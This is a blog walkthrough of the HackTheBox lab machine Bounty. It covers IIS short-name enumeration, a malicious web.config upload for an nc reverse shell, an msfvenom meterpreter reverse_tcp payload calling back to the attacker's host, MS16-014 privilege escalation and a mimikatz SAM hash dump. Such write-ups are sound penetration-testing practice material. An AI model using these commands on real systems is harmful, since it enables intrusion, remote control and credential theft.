---
layout: single
title:  "HTB - Bounty Writeup - 10.10.10.93"
date:   2020-07-27 08:49:23 +0100
categories: hackthebox
excerpt: My walkthrough of the HTB Windows Server 2008 R2 machine Bounty.
---
![htb](/images/bounty/htb.png)

# HackTheBox - Bounty - 10.10.10.93

Bounty is an easy rated Windows Server 2008 R2 machine on [hackthebox.eu](https://app.hackthebox.eu).

## Summary

Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches.

## Recon and Scanning
### NMAP Results
![](/images/bounty/nmap.png)

From the ports shown here I can see that this is a Windows Box running [IIS 7.5](https://docs.bmc.com/docs/display/Configipedia/Microsoft+Internet+Information+Services), meaning that we are dealing with a Windows Server 2008 R2 box.  

### IIS Enumeration

As IIS is the only port open we should start there, also, as this is a very outdated version of IIS we can assume that it may be vulnerable to a [this](http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf), which is a flaw that may lead to an unauthorized information disclosure. The issue is triggered during the parsing of a request that contains a tilde character (~). This may allow a remote attacker to gain access to file and folder name information. We can use [this](https://github.com/irsdl/IIS-ShortName-Scanner) script to figure out if it is vulnerable and to find any hidden file or directories.

The syntax of the command to find out if the IIS version in question is vulnerable is:
{% highlight bash %}
java -jar iis_shortname_scanner.jar http://10.10.10.93
{% endhighlight %}

![](/images/bounty/iis_vulnerable.png)

Now that we know the IIS server is vulnerable we can run the following command to enumerate hidden files and directories:
{% highlight bash %}
java -jar iis_shortname_scanner.jar 2 20 http://10.10.10.93
{% endhighlight %}

![](/images/bounty/iis_files.png)

### Custom Wordlist and GoBuster

Bingo! We have identified two files or directories starting with `tranf` and `upload`, therefore we can grep a directory list for the phrases and create a custom wordlist to use with gobuster.
![](/images/bounty/wordlist.png)

Now that we have a custom wordlist called `words` we can run gobuster, we also know that as this is an IIS Server we should also fuzz for files with a `.aspx` extension.

{% highlight bash %}
gobuster dir -u http://10.10.10.93 -w words -x aspx
{% endhighlight %}

![](/images/bounty/gobuster.png)

Nice, we have identified an `uploadedfiles` directory and the `transfer.aspx` page.

## Getting a Shell with a web.config file

Now that we know there is a page where we can upload files, we can attempt to get a shell using an IIS webshell. 

![](/images/bounty/transfer-aspx.png)

We can also guess that as this is an outdated IIS server we can probably use a web.config payload to get a shell. As the web.config file is not in an aspx format, rather in XML, it is much harder to block by AV. As the `web.config` file is similar to Apache's `.htaccess` file, it stores important settings, this means we can inject malicious code into the file and get execution. This [article](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) explains it very well.

### Creating a Malicious File

Firstly we will need to copy a malicious web.config file from [here](https://gist.github.com/003random/e646a2c3ef47f560f17e1dee0443f685#file-web-config), then we will need to insert code to run a nc reverse shell. 

![](/images/bounty/we-config-file.png)

We will also need to start an smb server to run nc remotely. This can be done using the Impacket `smbserver.py` script.

{% highlight bash %}
smbserver.py shared /usr/share/windows-binaries
{% endhighlight %}

![](/images/bounty/smbserver.png)

### Popping a Shell 

Now we can head over to `transfer.aspx` page and upload our malicious `web.config` file, whilst also starting an nc listener. Then we can go to `http://10.10.10.93/uploadedfiles/web.config`

![](/images/bounty/uploaded-files.png)

![](/images/bounty/shell-1.png)

Bingo! We got a shell!

## Upgrading to a Meterpreter Session

Now that we have a shell, we can generate a meterpreter payload and upgrade to a meterpreter session. Firstly, we need to generate a meterpreter payload and host it on out SMB server. 

### Generating a Meterpreter EXE Payload

{% highlight powershell %}
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=9002 -f exe > msf.exe
{% endhighlight %}

![](/images/bounty/msf-2.png)

Now that we have a payload, let's setup a listener in Metasploit. 

![](/images/bounty/msf-1.png)

{% highlight powershell %}
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
setg LHOST 10.10.14.15
set LPORT 9002
run
{% endhighlight %}

![](/images/bounty/msf-listner.png)

### Getting a Meterpreter Session 

Now that the listener and payload are ready, we can run it from our smb share. 

{% highlight powershell %}
\\10.10.14.15\shared\msf.exe
{% endhighlight %}

![](/images/bounty/meterpreter-1.png)

Bingo! Now that we have a meterpreter session we can attempt to privesc.

## Privilege Escalation to SYSTEM

As this is a stock `Windows Server 2008 R2` machine we should run the local exploit suggester module within metasploit.

### Post Local Exploit Suggester

{% highlight powershell %}
background
use post/multi/recon/local_exploit_suggester
{% endhighlight %}

![](/images/bounty/local-exploit.png)

`exploit/windows/local/ms16_014_wmi_recv_notif` looks promising so let's try this

### MS16_014_wmi_recv_notif

Let's load up this module as set the following options:
 - LHOST - 10.10.14.15
 - LPORT - 4444
 - SESSION - 1

![](/images/bounty/priv-esc-1.png)

{% highlight powershell %}
run
{% endhighlight %}

![](/images/bounty/shell-system.png)

Bingo, we got a shell as SYSTEM!

## User and Root Flags

Now that we have a shell as system, we can grab both the user and root flags

![](/images/bounty/flags.png)

## Beyond Root

Now that we have rooted the machine we can load mimikatz and dump the SAM hashes

{% highlight powershell %}
load mimikatz
mimikatz_command -f samdump::hashes
{% endhighlight %}

![](/images/bounty/hashdump.png)

## Pwned

![pwned](/images/bounty/pwned.png)

## Respect
If you enjoyed the write up or found it useful consider + repping my htb profile linked below:

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)

